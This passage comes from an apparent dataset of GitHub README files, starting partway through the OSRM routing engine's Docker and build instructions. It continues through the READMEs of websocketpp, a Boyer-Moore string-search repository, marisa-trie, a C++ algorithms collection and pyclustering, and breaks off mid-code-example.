Docker\n\nWe base our Docker images ([backend](https://hub.docker.com/r/osrm/osrm-backend/), [frontend](https://hub.docker.com/r/osrm/osrm-frontend/)) on Debian and make sure they are as lightweight as possible.\n\nDownload OpenStreetMap extracts for example from [Geofabrik](http://download.geofabrik.de/)\n\n    wget http://download.geofabrik.de/europe/germany/berlin-latest.osm.pbf\n\nPre-process the extract with the car profile and start a routing engine HTTP server on port 5000\n\n    docker run -t -v \"${PWD}:/data\" osrm/osrm-backend osrm-extract -p /opt/car.lua /data/berlin-latest.osm.pbf\n\nThe flag `-v \"${PWD}:/data\"` creates the directory `/data` inside the docker container and makes the current working directory `\"${PWD}\"` available there. The file `/data/berlin-latest.osm.pbf` inside the container is referring to `\"${PWD}/berlin-latest.osm.pbf\"` on the host.\n\n    docker run -t -v \"${PWD}:/data\" osrm/osrm-backend osrm-partition /data/berlin-latest.osrm\n    docker run -t -v \"${PWD}:/data\" osrm/osrm-backend osrm-customize /data/berlin-latest.osrm\n\nNote that `berlin-latest.osrm` has a different file extension. \n\n    docker run -t -i -p 5000:5000 -v \"${PWD}:/data\" osrm/osrm-backend osrm-routed --algorithm mld /data/berlin-latest.osrm\n\nMake requests against the HTTP server\n\n    curl \"http://127.0.0.1:5000/route/v1/driving/13.388860,52.517037;13.385983,52.496891?steps=true\"\n\nOptionally start a user-friendly frontend on port 9966, and open it up in your browser\n\n    docker run -p 9966:9966 osrm/osrm-frontend\n    xdg-open 'http://127.0.0.1:9966'\n\nIn case Docker complains about not being able to connect to the Docker daemon make sure you are in the `docker` group.\n\n    sudo usermod -aG docker $USER\n\nAfter adding yourself to the `docker` group make sure to log out and back in again with your terminal.\n\nWe support the following images on Docker Cloud:\n\nName | Description\n-----|------\n`latest` | `master` compiled with release flag\n`latest-assertions` | `master` compiled with with release flag, assertions enabled and debug symbols\n`latest-debug` | `master` compiled with debug flag\n`<tag>` | specific tag compiled with release flag\n`<tag>-debug` | specific tag compiled with debug flag\n\n### Building from Source\n\nThe following targets Ubuntu 16.04.\nFor instructions how to build on different distributions, macOS or Windows see our [Wiki](https://github.com/Project-OSRM/osrm-backend/wiki).\n\nInstall dependencies\n\n```bash\nsudo apt install build-essential git cmake pkg-config \\\nlibbz2-dev libxml2-dev libzip-dev libboost-all-dev \\\nlua5.2 liblua5.2-dev libtbb-dev\n```\n\nCompile and install OSRM binaries\n\n```bash\nmkdir -p build\ncd build\ncmake ..\ncmake --build .\nsudo cmake --build . --target install\n```\n\n### Request Against the Demo Server\n\nRead the [API usage policy](https://github.com/Project-OSRM/osrm-backend/wiki/Demo-server).\n\nSimple query with instructions and alternatives on Berlin:\n\n```\ncurl \"https://router.project-osrm.org/route/v1/driving/13.388860,52.517037;13.385983,52.496891?steps=true&alternatives=true\"\n```\n\n### Using the Node.js Bindings\n\nThe Node.js bindings provide read-only access to the routing engine.\nWe provide API documentation and examples [here](docs/nodejs/api.md).\n\nYou will need a modern `libstdc++` toolchain (`>= GLIBCXX_3.4.20`) for binary compatibility if you want to use the pre-built binaries.\nFor older Ubuntu systems you can upgrade your standard library for example with:\n\n```\nsudo add-apt-repository ppa:ubuntu-toolchain-r/test\nsudo apt-get update -y\nsudo apt-get install -y libstdc++-5-dev\n```\n\nYou can install the Node.js bindings via `npm install osrm` or from this repository either via\n\n    npm install\n\nwhich will check and use pre-built binaries if they're available for this release and your Node version, or via\n\n    npm install --build-from-source\n\nto always force building the Node.js bindings from source.\n\nFor usage details have a look [these API docs](docs/nodejs/api.md). \n\nAn exemplary implementation by a 3rd party with Docker and Node.js can be found [here](https://github.com/door2door-io/osrm-express-server-demo).\n\n\n## References in publications\n\nWhen using the code in a (scientific) publication, please cite\n\n```\n@inproceedings{luxen-vetter-2011,\n author = {Luxen, Dennis and Vetter, Christian},\n title = {Real-time routing with OpenStreetMap data},\n booktitle = {Proceedings of the 19th ACM SIGSPATIAL International Conference on Advances in Geographic Information Systems},\n series = {GIS '11},\n year = {2011},\n isbn = {978-1-4503-1031-4},\n location = {Chicago, Illinois},\n pages = {513--516},\n numpages = {4},\n url = {http://doi.acm.org/10.1145/2093973.2094062},\n doi = {10.1145/2093973.2094062},\n acmid = {2094062},\n publisher = {ACM},\n address = {New York, NY, USA},\n}\n```\n"}, {"repo": "/chriskohlhoff/asio", "language": "C++", "readme_contents": "error: no README"}, {"repo": "/zaphoyd/websocketpp", "language": "C++", "readme_contents": "WebSocket++ (0.8.1)\n==========================\n\nWebSocket++ is a header only C++ library that implements RFC6455 The WebSocket\nProtocol. It allows integrating WebSocket client and server functionality into\nC++ programs. It uses interchangeable network transport modules including one\nbased on raw char buffers, one based on C++ iostreams, and one based on Asio \n(either via Boost or standalone). End users can write additional transport\npolicies to support other networking or event libraries as needed.\n\nMajor Features\n==============\n* Full support for RFC6455\n* Partial support for Hixie 76 / Hybi 00, 07-17 draft specs (server only)\n* Message/event based interface\n* Supports secure WebSockets (TLS), IPv6, and explicit proxies.\n* Flexible dependency management (C++11 Standard Library or Boost)\n* Interchangeable network transport modules (raw, iostream, Asio, or custom)\n* Portable/cross platform (Posix/Windows, 32/64bit, Intel/ARM/PPC)\n* Thread-safe\n\nGet Involved\n============\n\n[![Build Status](https://travis-ci.org/zaphoyd/websocketpp.png)](https://travis-ci.org/zaphoyd/websocketpp)\n\n**Project Website**\nhttp://www.zaphoyd.com/websocketpp/\n\n**User Manual**\nhttp://docs.websocketpp.org/\n\n**GitHub Repository**\nhttps://github.com/zaphoyd/websocketpp/\n\nGitHub pull requests should be submitted to the `develop` branch.\n\n**Announcements Mailing List**\nhttp://groups.google.com/group/websocketpp-announcements/\n\n**IRC Channel**\n #websocketpp (freenode)\n\n**Discussion / Development / Support Mailing List / Forum**\nhttp://groups.google.com/group/websocketpp/\n\nAuthor\n======\nPeter Thorson - websocketpp@zaphoyd.com\n"}, {"repo": "/FooBarWidget/boyer-moore-horspool", "language": "HTML", "readme_contents": "Introduction\n============\nThis repository contains various C++ implementations of the Boyer-Moore string search algorithm and derivative algorithms. These family of algorithms allow fast searching of substrings, much faster than `strstr()` and `memmem()`. The longer the substring, the faster the algorithms work. The implementations are written to be both efficient and minimalist so that you can easily incorporate them in your own code.\n\nThis blog post has more information: http://blog.phusion.nl/2010/12/06/efficient-substring-searching/\n\n\nFiles\n-----\n\n### Horspool.cpp\nImplements Boyer-Moore-Horspool.\nHorspoolTest.cpp is the unit test file.\n\n### BoyerMooreAndTurbo.cpp\nImplements Boyer-Moore and Turbo Boyer-Moore. No special test files, but they're used in the benchmark program which serves as a basic sanity test.\n\n### StreamBoyerMooreHorspool.h\nA special Boyer-Moore-Horspool implementation that supports \"streaming\" input. Instead of supplying the entire haystack at once, you can supply the haystack piece-by-piece. This makes it especially suitable for parsing data that you may receive over the network. This implementation also contains various memory and CPU optimizations, allowing it to be slightly faster and to use less memory than Horspool.cpp. See the file for detailed documentation.\n\nUnit tests are in StreamTest.cpp.\n\n### benchmark.cpp\nBenchmark program. Used in combination with the `run_benchmark` Rake task.\n\n### TestMain.cpp\nUnit test runner program.\n\n\nTesting and benchmarking\n------------------------\n\nYou need Ruby and Rake. To compile the unit tests:\n\n    rake test\n    ./test\n\nTo run the benchmarks:\n\n    rake run_benchmark\n\n\nWhich algorithm to use?\n-----------------------\nI've found that, on average, Boyer-Moore-Horspool performs best thanks to its\nsimple inner loop which can be heavily optimized. It has pretty bad worst-case\nperformance but the worst case (or even bad cases) almost never occur in practice.\n"}, {"repo": "/pytries/marisa-trie", "language": "Python", "readme_contents": "marisa-trie |pyversions| |travis| |appveyor|\n============================================\n\n.. |pyversions| image:: https://img.shields.io/pypi/pyversions/marisa-trie.svg\n   :target: https://pypi.python.org/pypi/marisa-trie\n\n.. |travis| image:: https://travis-ci.org/pytries/marisa-trie.svg\n   :target: https://travis-ci.org/pytries/marisa-trie\n\n.. |appveyor| image:: https://ci.appveyor.com/api/projects/status/p887ad4jbdg6u7yo?svg=true\n   :target: https://ci.appveyor.com/project/superbobry/marisa-trie-75wx1\n\nStatic memory-efficient Trie-like structures for Python (2.7 and 3.4+)\nbased on `marisa-trie`_ C++ library.\n\nString data in a MARISA-trie may take up to 50x-100x less memory than\nin a standard Python dict; the raw lookup speed is comparable; trie also\nprovides fast advanced methods like prefix search.\n\n.. note::\n\n    There are official SWIG-based Python bindings included\n    in C++ library distribution; this package provides alternative\n    Cython-based pip-installable Python bindings.\n\n.. _marisa-trie: https://github.com/s-yata/marisa-trie\n\nInstallation\n============\n\n::\n\n    pip install marisa-trie\n\nUsage\n=====\n\nSee :ref:`Tutorial <tutorial>` and :ref:`API <api>` for details.\n\nCurrent limitations\n===================\n\n* The library is not tested with mingw32 compiler;\n* ``.prefixes()`` method of ``BytesTrie`` and ``RecordTrie`` is quite slow\n  and doesn't have iterator counterpart;\n* ``read()`` and ``write()`` methods don't work with file-like objects\n  (they work only with real files; pickling works fine for file-like objects);\n* there are ``keys()`` and ``items()`` methods but no ``values()`` method.\n\nLicense\n=======\n\nWrapper code is licensed under MIT License.\n\nBundled `marisa-trie`_ C++ library is dual-licensed under\nLGPL and BSD 2-clause license.\n"}, {"repo": "/xtaci/algorithms", "language": "C++", "readme_contents": "### Algorithms & Data Structures in C++\n\n[![Build Status][1]][2]\n\n[1]: https://travis-ci.org/xtaci/algorithms.svg?branch=master\n[2]: https://travis-ci.org/xtaci/algorithms\n\n#### \u76ee\u6807 ( goal ) :\n\n   1. \u7ecf\u5178\u7684\u7b97\u6cd5\u5b9e\u73b0      \n      (classical algorithms implementations)      \n   2. \u670d\u52a1\u5668\u7aef       \n      (based on linux/gcc)       \n   3. \u6b63\u786e\uff0c\u6613\u4e8e\u4f7f\u7528\u548c\u6539\u9020, \u4e00\u4e2a\u5934\u6587\u4ef6\u4e00\u4e2a\u7b97\u6cd5\uff0c\u5e76\u9644\u5e26\u4e00\u4e2ademo.       \n      (correct! and ease of use, one .header file per algorithm)        \n\n#### \u7ea6\u5b9a ( Convention ):\n\n   1.  \u4e00\u4e2a\u7b97\u6cd5\u7528\u4e00\u4e2a.h\u6587\u4ef6\u8868\u793a\u653e\u5230include\u4e0b. ( one .header file per algorithm. )\n   2.  \u7b97\u6cd5\u6f14\u793a\u7684demo\u7a0b\u5e8f\u653e\u5230src\u4e0b.  ( one demo per algorithm.  )\n   3.  \u7a0b\u5e8f\u6b63\u786e\u901a\u8fc7\u540e\uff0c\u8bf7\u53d1\u8d77Pull Requests\uff0c\u4ee3\u7801\u88ab\u9a8c\u8bc1\u540e\u5165\u5e93\uff0c\u5e76\u5728README\u4e2d\u53d1\u5e03\u65b0\u7b97\u6cd5\u5b9e\u73b0\u3002\n       (Please Use Fork+Pull Requests !!! Correctness is the most important!)\n   4.  TAB = 4 space.  set ts=4 in vim\n   5.  Graph\u7684\u8f93\u51fa\u683c\u5f0f\u4e3a [Graphviz](http://www.graphviz.org/) Dot\u683c\u5f0f.\n   \t(the output format of the graph is in dot of graphviz.)\n   \teg:\n   \t![demograph](demo_graph.png)\n\n#### \u5df2\u5b9e\u73b0 ( Implemented ):\n\n| Name | File |\n|------|------|\n|Array shuffle|https://github.com/xtaci/algorithms/blob/master/include/shuffle.h |\n|Prime test(trial division)|https://github.com/xtaci/algorithms/blob/master/include/prime.h|\n|Prime test(Miller-Rabin's method)|https://github.com/xtaci/algorithms/blob/master/include/prime.h|\n|2D Array|https://github.com/xtaci/algorithms/blob/master/include/2darray.h|\n|Arbitrary Integer|https://github.com/xtaci/algorithms/blob/master/include/integer.h|\n|Linear congruential generator|https://github.com/xtaci/algorithms/blob/master/include/random.h|\n|Maximum subarray problem|https://github.com/xtaci/algorithms/blob/master/include/max_subarray.h|\n|Bit-Set|https://github.com/xtaci/algorithms/blob/master/include/bitset.h|\n|Queue|https://github.com/xtaci/algorithms/blob/master/include/queue.h|\n|Stack|https://github.com/xtaci/algorithms/blob/master/include/stack.h|\n|Binary Heap|https://github.com/xtaci/algorithms/blob/master/include/heap.h|\n|Fibonacci Heap|https://github.com/xtaci/algorithms/blob/master/include/fib-heap.h|\n|Priority Queue (list based)|https://github.com/xtaci/algorithms/blob/master/include/priority_queue.h|\n|Bubble sort|https://github.com/xtaci/algorithms/blob/master/include/bubble_sort.h|\n|Selection sort|https://github.com/xtaci/algorithms/blob/master/include/selection_sort.h|\n|Insertion sort|https://github.com/xtaci/algorithms/blob/master/include/insertion_sort.h|\n|Shell sort|https://github.com/xtaci/algorithms/blob/master/include/shell_sort.h|\n|Radix sort|https://github.com/xtaci/algorithms/blob/master/include/radix_sort.h|\n|Quicksort|https://github.com/xtaci/algorithms/blob/master/include/quick_sort.h|\n|Merge sort|https://github.com/xtaci/algorithms/blob/master/include/merge_sort.h|\n|Double linked list|https://github.com/xtaci/algorithms/blob/master/include/double_linked_list.h|\n|Skip list|https://github.com/xtaci/algorithms/blob/master/include/skiplist.h|\n|Largest common sequence|https://github.com/xtaci/algorithms/blob/master/include/lcs.h|\n|Binary search tree|https://github.com/xtaci/algorithms/blob/master/include/binary_search_tree.h|\n|AVL tree|https://github.com/xtaci/algorithms/blob/master/include/avl.h|\n|Dynamic order statistics|https://github.com/xtaci/algorithms/blob/master/include/dos_tree.h|\n|Red-black tree|https://github.com/xtaci/algorithms/blob/master/include/rbtree.h|\n|Interval tree|https://github.com/xtaci/algorithms/blob/master/include/interval_tree.h|\n|Prefix Tree(Trie)|https://github.com/xtaci/algorithms/blob/master/include/trie.h|\n|Suffix Tree|https://github.com/xtaci/algorithms/blob/master/include/suffix_tree.h|\n|B-Tree|https://github.com/xtaci/algorithms/blob/master/include/btree.h|\n|Suffix Array|https://github.com/xtaci/algorithms/blob/master/include/suffix_array.h|\n|Hash by multiplication|https://github.com/xtaci/algorithms/blob/master/include/hash_multi.h|\n|Hash table|https://github.com/xtaci/algorithms/blob/master/include/hash_table.h|\n|Universal hash function|https://github.com/xtaci/algorithms/blob/master/include/universal_hash.h|\n|Perfect hash|https://github.com/xtaci/algorithms/blob/master/include/perfect_hash.h|\n|Java's string hash|https://github.com/xtaci/algorithms/blob/master/include/hash_string.h|\n|FNV-1a string hash|https://github.com/xtaci/algorithms/blob/master/include/hash_string.h|\n|SimHash|https://github.com/xtaci/algorithms/blob/master/include/simhash.h|\n|Bloom Filter|https://github.com/xtaci/algorithms/blob/master/include/bloom_filter.h|\n|SHA-1 Message Digest Algorithm|https://github.com/xtaci/algorithms/blob/master/include/sha1.h|\n|MD5|https://github.com/xtaci/algorithms/blob/master/include/md5.h|\n|Base64|https://github.com/xtaci/algorithms/blob/master/include/base64.h|\n|Strongly Connected Components(SCC)|https://github.com/xtaci/algorithms/blob/master/include/scc.h|\n|Prim's minimum spanning tree|https://github.com/xtaci/algorithms/blob/master/include/prim_mst.h|\n|Kruskal MST|https://github.com/xtaci/algorithms/blob/master/include/kruskal_mst.h|\n|Breadth First Search|https://github.com/xtaci/algorithms/blob/master/include/graph_search.h|\n|Depth First Search|https://github.com/xtaci/algorithms/blob/master/include/graph_search.h|\n|Dijkstra's algorithm|https://github.com/xtaci/algorithms/blob/master/include/dijkstra.h|\n|Bellman-Ford algorithm|https://github.com/xtaci/algorithms/blob/master/include/bellman_ford.h|\n|Edmonds-Karp Maximal Flow|https://github.com/xtaci/algorithms/blob/master/include/edmonds_karp.h|\n|Push\u2013Relabel algorithm|https://github.com/xtaci/algorithms/blob/master/include/relabel_to_front.h|\n|Huffman Coding|https://github.com/xtaci/algorithms/blob/master/include/huffman.h|\n|Word segementation|https://github.com/xtaci/algorithms/blob/master/include/word_seg.h|\n|A\\* algorithm|https://github.com/xtaci/algorithms/blob/master/include/astar.h|\n|K-Means|https://github.com/xtaci/algorithms/blob/master/include/k-means.h|\n|Knuth\u2013Morris\u2013Pratt algorithm|https://github.com/xtaci/algorithms/blob/master/include/kmp.h|\n|Disjoint-Set|https://github.com/xtaci/algorithms/blob/master/include/disjoint-set.h|\n|8-Queue Problem|https://github.com/xtaci/algorithms/blob/master/include/8queen.h|\n|Palindrome|https://github.com/xtaci/algorithms/blob/master/include/palindrome.h|\n|LCA using Binary Lifting|https://github.com/xtaci/algorithms/blob/master/include/LCA.h|\n\n#### \u8d21\u732e\u8005 ( Contributors ) :  \n    Samana:  for heavy work of MSVC compatability\n    wycg1984: for K-Means\n    xmuliang: for HeapSort, Kruskal MST\n    wyh267: for base64, LRU, bubble sort, selection sort\n    ZhangYou0122: Push-Relabel algorithm, Suffix Tree           \n    UsingtcNower: Suffix Array\n    afernandez90: AVL trees\n\n#### \u652f\u6301\u6b64\u9879\u76ee ( Donations ) :     \n![donate](donate_alg.png)          \n\u6b22\u8fce\u4f7f\u7528\u652f\u4ed8\u5b9d\u626b\u63cf\u4e0a\u9762\u7684\u4e8c\u7ef4\u7801\uff0c\u5bf9\u8be5\u9879\u76ee\u8fdb\u884c\u6350\u8d60\u3002\u6350\u8d60\u6b3e\u9879\u5c06\u7528\u4e8e\u6301\u7eed\u4f18\u5316\u8865\u5168\u53ca\u5b8c\u5584\u3002 \n"}, {"repo": "/annoviko/pyclustering", "language": "Python", "readme_contents": "|Build Status Linux MacOS| |Build Status Win| |Coverage Status| |Documentation| |PyPi| |Download Counter| |JOSS|\n\nPyClustering\n============\n\n**pyclustering** is a Python, C++ data mining library (clustering\nalgorithm, oscillatory networks, neural networks). The library provides\nPython and C++ implementations (via CCORE library) of each algorithm or\nmodel. CCORE library is a part of pyclustering and supported only for\nLinux, Windows and MacOS operating systems.\n\n**Version**: 0.9.dev\n\n**License**: GNU General Public License\n\n**E-Mail**: pyclustering@yandex.ru\n\n**Documentation**: https://pyclustering.github.io/docs/0.9.2/html/index.html\n\n**Homepage**: https://pyclustering.github.io/\n\n**PyClustering Wiki**: https://github.com/annoviko/pyclustering/wiki\n\n\n\nDependencies\n============\n\n**Required packages**: scipy, matplotlib, numpy, Pillow\n\n**Python version**: >=3.5 (32-bit, 64-bit)\n\n**C++ version**: >= 14 (32-bit, 64-bit)\n\n\n\nPerformance\n===========\n\nEach algorithm is implemented using Python and C/C++ language, if your platform is not supported then the Python\nimplementation is used, otherwise C/C++. The implementation can be chosen by **ccore** flag (by default it is always\n'True' and it means that the C/C++ implementation is used), for example:\n\n.. code:: python\n\n    # As by default - C/C++ is used\n    xmeans_instance_1 = xmeans(data_points, start_centers, 20, ccore=True);\n\n    # The same - C/C++ is used by default\n    xmeans_instance_2 = xmeans(data_points, start_centers, 20);\n\n    # Switch off core - Python is used\n    xmeans_instance_3 = xmeans(data_points, start_centers, 20, ccore=False);\n\n**ccore** option runs ccore shared library (core of the pyclustering library). The core is maintained for Linux, Windows and MacOS.\n\n\n\nInstallation\n============\n\nInstallation using pip3 tool:\n\n.. code:: bash\n\n    $ pip3 install pyclustering\n\nManual installation using GCC:\n\n.. code:: bash\n\n    # get sources of the pyclustering library, for example, from repository\n    $ mkdir pyclustering\n    $ cd pyclustering/\n    $ git clone https://github.com/annoviko/pyclustering.git .\n\n    # compile CCORE library (core of the pyclustering library)\n    # you can specify platform (32-bit: 'ccore_32bit', 64-bit: 'ccore_64bit')\n    $ cd ccore/\n    $ make ccore_64bit    # compile CCORE for 64-bit\n    # make ccore_32bit    # compile CCORE for 32-bit\n\n    # return to parent folder of the pyclustering library\n    cd ../\n\n    # add current folder to python path\n    PYTHONPATH=`pwd`\n    export PYTHONPATH=${PYTHONPATH}\n\nManual installation using Visual Studio:\n\n1. Clone repository from: https://github.com/annoviko/pyclustering.git\n2. Open folder pyclustering/ccore\n3. Open Visual Studio project ccore.sln\n4. Select solution platform: 'x86' or 'x64'\n5. Build 'ccore' project.\n6. Add pyclustering folder to python path.\n\n\n\nProposals, Questions, Bugs\n==========================\n\nIn case of any questions, proposals or bugs related to the pyclustering please contact to pyclustering@yandex.ru or create an issue here.\n\n\n\nPyClustering Status\n===================\n\n+----------------------+------------------------------+------------------------------------+--------------------------------+\n| Branch               | master                       | 0.9.dev                            | 0.9.2.rel                      |\n+======================+==============================+====================================+================================+\n| Build (Linux, MacOS) | |Build Status Linux MacOS|   | |Build Status Linux MacOS 0.9.dev| | |Build Status Linux 0.9.2.rel| |\n+----------------------+------------------------------+------------------------------------+--------------------------------+\n| Build (Win)          | |Build Status Win|           | |Build Status Win 0.9.dev|         | |Build Status Win 0.9.2.rel|   |\n+----------------------+------------------------------+------------------------------------+--------------------------------+\n| Code Coverage        | |Coverage Status|            | |Coverage Status 0.9.dev|          | |Coverage Status 0.9.2.rel|    |\n+----------------------+------------------------------+------------------------------------+--------------------------------+\n\n\n\nCite the Library\n================\n\nIf you are using pyclustering library in a scientific paper, please, cite the library:\n\nNovikov, A., 2019. PyClustering: Data Mining Library. Journal of Open Source Software, 4(36), p.1230. Available at: http://dx.doi.org/10.21105/joss.01230.\n\nBibTeX entry:\n\n.. code::\n\n    @article{Novikov2019,\n        doi         = {10.21105/joss.01230},\n        url         = {https://doi.org/10.21105/joss.01230},\n        year        = 2019,\n        month       = {apr},\n        publisher   = {The Open Journal},\n        volume      = {4},\n        number      = {36},\n        pages       = {1230},\n        author      = {Andrei Novikov},\n        title       = {{PyClustering}: Data Mining Library},\n        journal     = {Journal of Open Source Software}\n    }\n\n\n\nBrief Overview of the Library Content\n=====================================\n\n**Clustering algorithms and methods (module pyclustering.cluster):**\n\n+------------------------+---------+-----+\n| Algorithm              | Python  | C++ |\n+========================+=========+=====+\n| Agglomerative          | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| BANG                   | \u2713       |     |\n+------------------------+---------+-----+\n| BIRCH                  | \u2713       |     |\n+------------------------+---------+-----+\n| BSAS                   | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| CLARANS                | \u2713       |     |\n+------------------------+---------+-----+\n| CLIQUE                 | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| CURE                   | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| DBSCAN                 | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| Elbow                  | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| EMA                    | \u2713       |     |\n+------------------------+---------+-----+\n| Fuzzy C-Means          | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| GA (Genetic Algorithm) | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| G-Means                | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| HSyncNet               | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| K-Means                | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| K-Means++              | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| K-Medians              | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| K-Medoids              | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| MBSAS                  | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| OPTICS                 | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| ROCK                   | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| Silhouette             | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| SOM-SC                 | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| SyncNet                | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| Sync-SOM               | \u2713       |     |\n+------------------------+---------+-----+\n| TTSAS                  | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| X-Means                | \u2713       | \u2713   |\n+------------------------+---------+-----+\n\n\n**Oscillatory networks and neural networks (module pyclustering.nnet):**\n\n+--------------------------------------------------------------------------------+---------+-----+\n| Model                                                                          | Python  | C++ |\n+================================================================================+=========+=====+\n| CNN (Chaotic Neural Network)                                                   | \u2713       |     |\n+--------------------------------------------------------------------------------+---------+-----+\n| fSync (Oscillatory network based on Landau-Stuart equation and Kuramoto model) | \u2713       |     |\n+--------------------------------------------------------------------------------+---------+-----+\n| HHN (Oscillatory network based on Hodgkin-Huxley model)                        | \u2713       | \u2713   |\n+--------------------------------------------------------------------------------+---------+-----+\n| Hysteresis Oscillatory Network                                                 | \u2713       |     |\n+--------------------------------------------------------------------------------+---------+-----+\n| LEGION (Local Excitatory Global Inhibitory Oscillatory Network)                | \u2713       | \u2713   |\n+--------------------------------------------------------------------------------+---------+-----+\n| PCNN (Pulse-Coupled Neural Network)                                            | \u2713       | \u2713   |\n+--------------------------------------------------------------------------------+---------+-----+\n| SOM (Self-Organized Map)                                                       | \u2713       | \u2713   |\n+--------------------------------------------------------------------------------+---------+-----+\n| Sync (Oscillatory network based on Kuramoto model)                             | \u2713       | \u2713   |\n+--------------------------------------------------------------------------------+---------+-----+\n| SyncPR (Oscillatory network for pattern recognition)                           | \u2713       | \u2713   |\n+--------------------------------------------------------------------------------+---------+-----+\n| SyncSegm (Oscillatory network for image segmentation)                          | \u2713       | \u2713   |\n+--------------------------------------------------------------------------------+---------+-----+\n\n\n**Graph Coloring Algorithms (module pyclustering.gcolor):**\n\n+------------------------+---------+-----+\n| Algorithm              | Python  | C++ |\n+========================+=========+=====+\n| DSatur                 | \u2713       |     |\n+------------------------+---------+-----+\n| Hysteresis             | \u2713       |     |\n+------------------------+---------+-----+\n| GColorSync             | \u2713       |     |\n+------------------------+---------+-----+\n\n\n**Containers (module pyclustering.container):**\n\n+------------------------+---------+-----+\n| Algorithm              | Python  | C++ |\n+========================+=========+=====+\n| KD Tree                | \u2713       | \u2713   |\n+------------------------+---------+-----+\n| CF Tree                | \u2713       |     |\n+------------------------+---------+-----+\n\n\n\nExamples in the Library\n=======================\n\nThe library contains examples for each algorithm and oscillatory network model:\n\n**Clustering examples:** ``pyclustering/cluster/examples``\n\n**Graph coloring examples:** ``pyclustering/gcolor/examples``\n\n**Oscillatory network examples:** ``pyclustering/nnet/examples``\n\n.. image:: https://github.com/annoviko/pyclustering/blob/master/docs/img/example_cluster_place.png\n   :alt: Where are examples?\n\n\n\nCode Examples\n=============\n\n**Data clustering by CURE algorithm**\n\n.. code:: python\n\n    from pyclustering.cluster import cluster_visualizer;\n    from pyclustering.cluster.cure import cure;\n    from pyclustering.utils import read_sample;\n    from pyclustering.samples.definitions import FCPS_SAMPLES;\n\n    # Input data in following format [ [0.1, 0.5], [0.3, 0.1], ... ].\n    input_data = read_sample(FCPS_SAMPLES.SAMPLE_LSUN);\n\n    # Allocate three clusters.\n    cure_instance = cure(input_data, 3);\n    cure_instance.process();\n    clusters = cure_instance.get_clusters();\n\n    # Visualize allocated clusters.\n    visualizer = cluster_visualizer();\n    visualizer.append_clusters(clusters, input_data);\n    visualizer.show();\n\n**Data clustering by K-Means algorithm**\n\n.. code:: python\n\n    from pyclustering.cluster.kmeans import kmeans, kmeans_visualizer\n    from pyclustering.cluster.center_initializer import kmeans_plusplus_initializer\n    from pyclustering.samples.definitions import FCPS_SAMPLES\n    from pyclustering.utils import read_sample\n\n    # Load list of points for cluster analysis.\n    sample = read_sample(FCPS_SAMPLES.SAMPLE_TWO_DIAMONDS)\n\n    # Prepare initial centers using K-Means++ method.\n    initial_centers = kmeans_plusplus_initializer(sample, 2).initialize()\n\n    # Create instance of K-Means algorithm with prepared centers.\n    kmeans_instance = kmeans(sample, initial_centers)\n\n    # Run cluster analysis and obtain results.\n    kmeans_instance.process()\n    clusters = kmeans_instance.get_clusters()\n    final_centers = kmeans_instance.get_centers()\n\n    # Visualize obtained results\n    kmeans_visualizer.show_clusters(sample, clusters, final_centers)\n\n**Data clustering by OPTICS algorithm**\n\n.. code:: python\n\n    from pyclustering.cluster import cluster_visualizer\n    from pyclustering.cluster.optics import optics, ordering_analyser, ordering_visualizer\n    from pyclustering.samples.definitions import FCPS_SAMPLES\n    from pyclustering.utils import read_sample\n\n    # Read sample for clustering from some file\n    sample = read_sample(FCPS_SAMPLES.SAMPLE_LSUN)\n\n    # Run cluster analysis where connectivity radius is bigger than real\n    radius = 2.0\n    neighbors = 3\n    amount_of_clusters = 3\n    optics_instance = optics(sample, radius, neighbors, amount_of_clusters)\n\n    # Performs cluster analysis\n    optics_instance.process()\n\n    # Obtain results of clustering\n    clusters = optics_instance.get_clusters()\n    noise = optics_instance.get_noise()\n    ordering = optics_instance.get_ordering()\n\n    # Visualize ordering diagram\n    analyser = ordering_analyser(ordering)\n    ordering_visualizer.show_ordering_diagram(analyser, amount_of_clusters)\n\n    # Visualize clustering results\n    visualizer = cluster_visualizer()\n    visualizer.append_clusters(clusters, sample)\n    visualizer.show()\n\n**Simulation of oscillatory network PCNN**\n\n.. code:: python\n\n    from pyclustering.nnet.pcnn import pcnn_network, pcnn_visualizer\n\n    # Create Pulse-Coupled neural network with 10 oscillators.\n    net = pcnn_network(10)\n\n    # Perform simulation during 100 steps using binary external stimulus.\n    dynamic = net.simulate(50, [1, 1, 1, 0, 0, 0, 0, 1, 1, 1])\n\n    # Allocate synchronous ensembles from the output dynamic.\n    ensembles = dynamic.allocate_sync_ensembles()\n\n    # Show output dynamic.\n    pcnn_visualizer.show_output_dynamic(dynamic, ensembles)\n\n**Simulation of chaotic neural network CNN**\n\n.. code:: python\n\n    from pyclustering.cluster import cluster_visualizer\n    from pyclustering.samples.definitions import SIMPLE_SAMPLES\n    from pyclustering.utils import read_sample\n    from pyclustering.nnet.cnn import cnn_network, cnn_visualizer\n\n    # Load stimulus from file.\n    stimulus = read_sample(SIMPLE_SAMPLES.SAMPLE_SIMPLE3)\n\n    # Create chaotic neural network, amount of neurons should be equal to amount of stimulus.\n    network_instance = cnn_network(len(stimulus))\n\n    # Perform simulation during 100 steps.\n    steps = 100\n    output_dynamic = network_instance.simulate(steps, stimulus)\n\n    # Display output dynamic of the network.\n    cnn_visualizer.show_output_dynamic(output_dynamic)\n\n    # Display dynamic matrix and observation matrix to show clustering phenomenon.\n    cnn_visualizer.show_dynamic_matrix(output_dynamic)\n    cnn_visualizer.show_observation_matrix(output_dynamic)\n\n    # Visualize clustering results.\n    clusters = output_dynamic.allocate_sync_ensembles(10)\n    visualizer = 